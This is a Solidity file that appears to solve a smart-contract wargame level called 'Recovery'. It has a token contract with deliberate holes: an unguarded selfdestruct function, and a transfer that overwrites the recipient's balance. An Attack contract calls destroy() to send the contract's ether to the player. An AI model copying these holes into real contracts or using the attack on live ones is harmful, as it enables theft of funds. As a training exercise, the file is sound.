// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}

//you can find the lost address of the contract via script using rlp and keccak modules
// Or you can find via explorer with the help of transaction at deployment time.
interface ISimpleToken {
    function destroy(address payable _recipient) external;
}

contract Attack {
    ISimpleToken public simpleToken;
    //passing the lost contract address
    constructor(address payable _tokenAddress) {
        simpleToken = ISimpleToken(_tokenAddress);
    }
    //passing the player address
    function attack(address payable _recipient) public {
        simpleToken.destroy(_recipient);
    }
}


